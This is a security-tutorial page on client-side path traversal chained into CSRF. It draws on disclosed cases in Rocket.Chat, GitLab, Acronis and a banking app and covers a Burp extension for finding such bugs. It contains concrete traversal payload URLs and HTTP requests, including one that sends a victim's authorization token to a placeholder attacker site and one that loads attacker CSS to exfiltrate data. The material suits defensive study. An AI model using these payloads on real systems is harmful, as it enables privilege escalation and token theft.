---
description: 'CWE-35: Path Traversal'
---

# Cross-Site Path Traversal  (CSPT)

## Introduction

Client-Side Path Traversal (CSPT) is a security vulnerability that arises when user-controlled input is used to manipulate file paths or resource URLs on the client side, potentially leading to unauthorized access or unintended manipulation of resources. While it may seem less prominent compared to server-side vulnerabilities, CSPT can have significant consequences if exploited.

CSPT vulnerabilities occur in scenarios where a web application uses client-side technologies, such as JavaScript, to dynamically construct or fetch resources. The flaw emerges when user input is used to modify file paths or URLs without proper validation or sanitization.

## CSPT2CSRF

Some times there is shareable links you got the link and then the front end sends API request POST Based Ger's your data with authorization header

<figure><img src="../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

With CSPT we can perform XSRF to another endpoint&#x20;

<figure><img src="../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

**A Client-Side Path Traversal can be split into two parts**

* The **source** is the **trigger of the CSPT**&#x20;
  * Data controlled by a user (Dom, Reflected, Stored)&#x20;
  * URL fragment&#x20;
  * URL Query&#x20;
  * Path parameters
  * Data injected in the database&#x20;
  * Can be triggered when the page is loaded or on user action
* The **sinks** are the exploitable endpoints that **can be reached by this CSPT**
  * This source value must be reflected in the path of another request
  * Re-route of a legit API request&#x20;
  * No control of the HTTP request other than the PATH

<figure><img src="../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

An **exploitable sink is a reachable endpoint that shares the same restrictions**&#x20;

* Host&#x20;
* Headers&#x20;
* Body&#x20;

Restrictions are specific to the source.

**How to find impactful sinks ?**

* API documentation
* Source code review
* Semgrep rules
* Burp Suite Bambda filter

<figure><img src="../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (270).png" alt=""><figcaption><p>Same Host, Headers and Body</p></figcaption></figure>

## Real-World Scenarios

### **1-click CSPT2CSRF in Rocket.Chat**

* [https://www.doyensec.com/resources/Doyensec\_CSPT2CSRF\_OWASP\_Appsec\_Lisbon.pdf](https://www.doyensec.com/resources/Doyensec\_CSPT2CSRF\_OWASP\_Appsec\_Lisbon.pdf)

```javascript
const appId = useSearchParameter('id');
const queryUrl = useSearchParameter('url');
const [installing, setInstalling] = useState(false);
const endpointAddress = appId ? `/apps/${appId}`: '/apps';
const downloadApp = useEndpoint('POST', endpointAddress);
```

**1-click CSPT2CSRF - Sink restrictions**

* POST endpoint&#x20;
* No mandatory BODY parameters other than url and `downloadOnly`&#x20;
* Attacker can control the path parameters&#x20;
* Attacker can pass additional GET parameters&#x20;
* The back end is lax on accepting extra body parameters

**Targetable sinks:**

* `/api/v1/livechat/department/:id/unarchive`&#x20;
* `/api/v1/livechat/department/:id/archive`&#x20;
* `/api/v1/dns.resolve.txt?url=open.rocket.chat`&#x20;
* `/api/v1/users.logoutOtherClients`&#x20;
* `/api/v1/users.2fa.enableEmail`

**Steps to reporduce**

1.  Victim visits:&#x20;

    **/marketplace/private/install?id=../../../api/v1/users.logoutOtherClients\&url=https://google.com**
2. &#x20;Victim clicks on “Install”&#x20;
3. POST HTTP request is sent to `/api/v1/ users.logoutOtherClients`

<figure><img src="../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

### CSPT2CSRF Leads to 1-Click cancel a bank card

{% embed url="https://www.erasec.be/blog/client-side-path-manipulation/" %}

**Normal Workflow**

When a user clicked the invite link, it triggered a series of requests, including a POST request to the backend with the `inviteCode` and the user’s email.

`https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789`

```http
POST /invite/123456789/check HTTP/1.1
Host: backend.example.com
X-Xsrf-Token: My-CSRF-TOKEN
Content-Type: application/json
Content-Length: 41

{"email":"foo@bar.com"}
```

**Exploitation via Path Manipulation**

By modifying the `inviteCode` parameter to include a path traversal payload (e.g., `inviteCode=123456789/../../../FOO`), the attacker could change the destination of the POST request. This manipulation allowed the attacker to target other endpoints on the backend, such as the endpoint to cancel a bank card.

`https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../FOO`

```http
POST /FOO/check HTTP/1.1
Host: backend.example.com
Content-Type: application/json
X-Xsrf-Token: My-CSRF-TOKEN
Content-Length: 41
Origin: https://example.com
Connection: close

{"email":"foo@bar.com"}
```

**The Attack**

The crafted invite link was designed to exploit the path traversal vulnerability, altering the final destination URL of the POST request. When an authenticated admin clicked the link, the request was sent to the backend, effectively canceling a bank card without their knowledge. This was possible even though the body of the request remained unchanged.

`https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=`

```http
POST /cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=/check HTTP/1.1
Host: backend.example.com
Accept: application/json; charset=utf-8
X-Xsrf-Token: MY-CSRF-TOKEN
Content-Length: 41
Origin: https://example.com

{"email":"foo@bar.com"}
```

```http
HTTP/1.1 200 OK
Date: Thu, 10 Nov 2022 09:59:05 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 0
Connection: close

[ ... Trimmed for brievety... ]
```



**Bonus Discovery**

Further exploration revealed a super-admin endpoint that accepted similar requests. If the attacker could trick a super-admin into clicking a malicious link, it could escalate privileges, granting super-admin access.

### Using CSPT vulnerability to include external CSS:

{% embed url="https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html" %}

In an Acronis web application, Medi discovered a CSS Injection vulnerability through a Client-Side Path Traversal combined with an Open Redirect. The JavaScript function `makeCssLink()` constructed a URL for a CSS file based on a user-controllable `color_scheme` parameter, which was not sanitized. By manipulating the parameter, an attacker could perform a path traversal to load malicious CSS files from an external domain

If we go to the **main page** which is `https://mc-beta-cloud.acronis.com/mc/?color_scheme=PARAMETER` with the **color\_scheme** GET parameter found in the javascript, we can see by reading the code that it will get the parameter value and make a GET request concatenating the previous value to a Relative URL where to load the CSS file, in this case **theme.{COLOR\_SCHEME\_PARAMETER}.css**.

For the previous URL the CSS requested will be `https://mc-beta-cloud.acronis.com/mc/theme.PARAMETER.css`.

For example, if you go to:

`https://mc-beta-cloud.acronis.com/mc/?color_scheme=%2F..%2F..%2FPARAMETER`

\
You will notice the CSS is loaded from `https://mc-beta-cloud.acronis.com/PARAMETER.css`, confirming the **Client Side Path Traversal** issue.

The Reasearcher compinesd it with  open redirect he discovered in state parameter&#x20;

```http
GET /api/2/idp/authorize/?client_id={CLIENT-ID}&redirect_uri=%2Fhci%2Fcallback&response_type=code&scope=openid&state=http://localhost&nonce=bhgjuvrrvpwauibleqhvfqat HTTP/1.1
Host: ...

HTTP/1.1 302 Found
Location: /hci/callback=code={CODE}&state=http://localhost
-------------------------------------------------------------
GET /hci/callback=code={CODE}&state=http://localhost HTTP/1.1
Host: ...

HTTP/1.1 302 Found
Location: http://localhost

Open Redirect confirmed
```

To combine the two techniques, you can set the `color_scheme` GET parameter to the following URL-encoded value:

```http
%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3D
fb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D
%252Fhci%252Fcallback%26response_type%3Dcode%26
scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26
nonce%3Dbhgjuvrrvpwauibleqhvfqat
```

For clarity, decode this parameter as follows:

```http
/../../../api/2/idp/authorize/?client_id={CLIENT-ID}&
redirect_uri=%2Fhci%2Fcallback&response_type=code&scope=openid
&state=http%3A%2F%2Flocalhost%2Fcss%2Fcore.css&nonce=bhgjuvrrvpwauibleqhvfqat
```

In this payload, the first action is to overwrite the relative path to the root directory of the application. Next, it specifies the vulnerable endpoint for Open Redirect, which then redirects the user to `http://localhost/core/css.css`—where the CSS file used to exfiltrate user information is hosted.

As a result, the browser will load your CSS file, allowing you to exfiltrate personal data from the user.

The final URL to load the external CSS would look like this:

```http
https://mc-beta-cloud.acronis.com/mc/?color_scheme=%2F..%2F..%2F..%2F
api%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80
%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3D
code%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css
%26nonce%3Dbhgjuvrrvpwauibleqhvfqat
```

**POC**\
[https://youtu.be/srPv75HS6Nk](https://youtu.be/srPv75HS6Nk)

### CSPT leading to 1-click CSRF in Gitlab

{% embed url="https://gitlab.com/gitlab-org/gitlab/-/issues/365427" %}

**Vulnerability Description**

The vulnerability exploits the GitLab error tracking functionality by configuring a project to use a compromised Sentry server. Here’s a detailed breakdown of the attack vector:

**Setup and Configuration:**

An attacker begins by setting up a GitLab project with a malicious Sentry server URL. This server is designed to provide error data with specially crafted IDs that include path traversal sequences. Error tracking is then enabled in the GitLab project using this fake Sentry server. This setup ensures that any errors reported by this server will appear on the GitLab error tracking page.

**Injection and Manipulation:**

The attacker crafts error IDs containing path traversal patterns, such as `../../../../api/v4/`, which manipulate GitLab's API endpoints. For instance, an error ID like `../../../../api/v4/users/4?admin=true#` can be injected to perform actions such as escalating user privileges. The lack of sanitization and validation for these IDs allows such manipulations to reach the API endpoints.

**Exploit Mechanism:**

On the GitLab error tracking page, these manipulated error IDs generate action buttons such as "ignore" or "resolve." When a user clicks on these buttons, a PUT request is sent to the GitLab API with the injected path. The lack of validation on the error ID means that any arbitrary PUT request can be made, leading to unauthorized actions on the GitLab instance.

**Social Engineering:**

To enhance the effectiveness of the attack, the attacker sets the error titles to blank spaces, thereby removing links to detailed error pages and emphasizing only the action buttons. This tactic increases the likelihood of the victim (especially if an administrator) interacting with these buttons under the false pretense of resolving errors.

**Impact:**

The primary consequence of this vulnerability is the potential for privilege escalation. Malicious action buttons can be used to perform unauthorized actions such as:

* **Privilege Escalation:** Making a user an admin with `PUT /users/:id`.
* **Group Membership Changes:** Adjusting group membership status with `PUT /groups/:id/members/:user_id/state`.
* **Approving Membership Requests:** Validating member requests with `PUT /groups/:id/members/:member_id/approve`. These actions can lead to significant security risks, including unauthorized access and control over GitLab resources.

**Steps to Reproduce**

1. **Setting Up the Environment:**
   * Create a new GitLab project and configure error tracking with the spoofed Sentry server.
   * Use specific error IDs designed to craft malicious PUT requests.
2. **Simulating the Attack:**
   * Log in as a regular user (attacker) and set up the spoofed Sentry server in the project settings.
   * Invite an admin user (victim) to the project and encourage them to interact with the error tracking page.
3. **Executing the Exploit:**
   * Ensure the victim clicks on the action buttons associated with the malicious error IDs.
   * Verify that the intended unauthorized actions, such as privilege escalation or data modification, are successfully executed.

<figure><img src="../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### CSPT + SSRF = Steal AUTH Token&#x20;

{% embed url="https://x.com/samwcyo/status/1437030056627523590?lang=fr" %}

The blind SSRF vulnerability requires an authorization header to be sent to the server, which is then passed through a `url` parameter in a GET request. Since CSRF attacks cannot directly force a victim's browser to send an authorization header, exploiting this SSRF directly would be challenging. However, if client-side path traversal is present, it opens up new avenues for exploitation.

**Exploit Scenario**

**Identifying the Blind SSRF:**

* The API endpoint vulnerable to blind SSRF accepts a `url` parameter, and it forwards any provided authorization header to the specified URL. The API endpoint is accessed via a GET request, such as `/example?url=https://`.

**Exploring for Client-Side Path Traversal:**

* By examining the application’s client-side JavaScript, particularly looking at navigation and URL handling, you can find client-side path traversal vulnerabilities. These are often easier to discover in large applications with complex JavaScript files.
* For instance, parameters passed through the URL, such as `?x=1`, or values in the URL hash might be processed by the client-side JavaScript and result in HTTP requests being made on behalf of the user.

**Combining Vulnerabilities for Exploitation:**

* Discover a client-side path traversal vulnerability where parameters are used in HTTP requests, like `?id=1`, leading to an API call such as `/api/users/1`.
*   Craft a payload to leverage both vulnerabilities. For example:

    ```bash
    bashCopy codehttps://victimsite/users?id=/../../example?url=https://attacker-site/?payload
    ```
* Here’s how it works:
  * The client-side path traversal payload (`/../../example`) is designed to manipulate the server's behavior.
  * When the SSRF endpoint processes the URL, it triggers the request to `https://attacker-site/?payload`, which causes the victim's browser to send the authorization bearer with the request, thus allowing the attacker to capture it.

## CSPT Burp Extension

{% embed url="https://github.com/doyensec/CSPTBurpExtension" %}

**Configurations**

<figure><img src="../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

**Results**

<figure><img src="../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

**Removing False Positives**

<figure><img src="../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

**Passive Scanner**

<figure><img src="../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

**Export Source With Canary**

<figure><img src="../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

### Automate CSPT2CSRF Using the Burp Extension

1. Crawl the target to fill your proxy history
2. Define scope&#x20;
3. Click on “Scan”
4. Click on “Export Sources With Canary”
5. Open all these URLs in your browser
6. Check if any issue has been created by the extension (Passive scanner)

### CSPT Burp Extension Limitations&#x20;

While the CSPT (Client-Side Path Traversal) Burp Extension is a powerful tool for identifying vulnerabilities, it does have some limitations:

1. **No DOM or Stored Sources without Canary Token**:
   * The extension might not effectively detect vulnerabilities related to DOM-based or stored sources unless a canary token is used. A canary token is a marker used to track and identify when and where a vulnerability is triggered, especially for DOM or stored XSS.
2. **Client-Side Routing**:
   * Some front-end frameworks implement client-side routing, which means navigation occurs within the browser without sending new requests to the server. As a result, these routes may not be captured by Burp Suite during testing, potentially missing vulnerabilities.
3. **Proper Crawling of the Application**:
   * For comprehensive testing, the entire application needs to be properly crawled. Incomplete crawling may result in missed paths or functionalities where vulnerabilities could exist.

#### **Solutions to These Limitations**

To overcome these limitations, consider the following approaches:

1. **Source Code Review**:
   * Conducting a manual or automated review of the source code can help identify vulnerabilities that the Burp Extension might miss, especially those related to DOM-based or stored XSS vulnerabilities.
2. **SAST with Appropriate Rules**:

> **SAST** stands for **Static Application Security Testing**. It refers to the process of analyzing source code or compiled versions of code for security vulnerabilities without actually executing the program. SAST tools scan the codebase to identify potential vulnerabilities early in the development cycle, allowing developers to fix them before the application is deployed.

* Using SAST tools with custom rules (e.g., Semgrep) can help detect security issues in the codebase that might not be apparent through dynamic testing alone. SAST tools can analyze client-side routing and other code patterns that are not captured during the Burp Suite testing process.



## Sink Exploitation Takeaways

When exploiting vulnerabilities in sinks, especially in the context of web applications, there are several common techniques and considerations that can be employed to bypass protections or exploit the system more effectively. Below are some key takeaways:

**Common URL Exploitation Bypasses**

1. **Passing Parameters to Backend**:
   * Exploiting the ability to pass parameters through the URL to manipulate backend behavior. This can include injecting unexpected or malicious parameters that alter the intended operation.
2. **Using `?` in the Sink to Add Additional Query Parameters**:
   * The `?` character can be used to append additional query parameters to a URL, potentially altering the request in a way that exposes or manipulates data on the backend.
3. **Using `?`, `#`, `;` in the Sink to Remove Extra Query Parameters**:
   * These characters can sometimes be leveraged to truncate or remove unwanted query parameters from a URL, potentially bypassing security filters or altering the behavior of the request.
4. **Lax Acceptance of Extra Body Parameters by Some Backends**:
   * Some backend systems may not strictly validate the parameters in the body of a request, allowing extra or unexpected parameters to be accepted and processed, which can lead to unintended behaviors.
5. **Acceptance of JSON Body Parameters as Query Parameters**:
   * Certain backends might interpret JSON body parameters as query parameters, allowing an attacker to manipulate these values in ways that bypass intended security controls.
6. **HTTP Method Override**:
   * By exploiting headers like `X-HTTP-Method-Override`, an attacker may be able to change the HTTP method (e.g., from GET to POST) to perform actions that wouldn't normally be allowed with the original method.
7. **URL Encoding or Double URL Encoding to Exploit Path Parameters**:
   * Encoding or double-encoding parts of the URL can be used to manipulate path parameters, potentially bypassing security measures or exploiting specific behaviors in the URL parsing logic of the backend.
8. **Do Not Underestimate Sinks with Other HTTP Methods: PUT, PATCH, DELETE, and GET**:
   * Exploitation isn't limited to POST requests. Methods like PUT, PATCH, DELETE, and even GET can be used in various ways to achieve similar or different effects, depending on how the backend processes these requests.

<figure><img src="../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

## Additional Resources

{% embed url="https://blog.doyensec.com/2024/07/02/cspt2csrf.html" %}

* [https://www.doyensec.com/resources/Doyensec\_CSPT2CSRF\_OWASP\_Appsec\_Lisbon.pdf](https://www.doyensec.com/resources/Doyensec\_CSPT2CSRF\_OWASP\_Appsec\_Lisbon.pdf)
* [https://www.usenix.org/system/files/sec21-khodayari.pdf](https://www.usenix.org/system/files/sec21-khodayari.pdf)
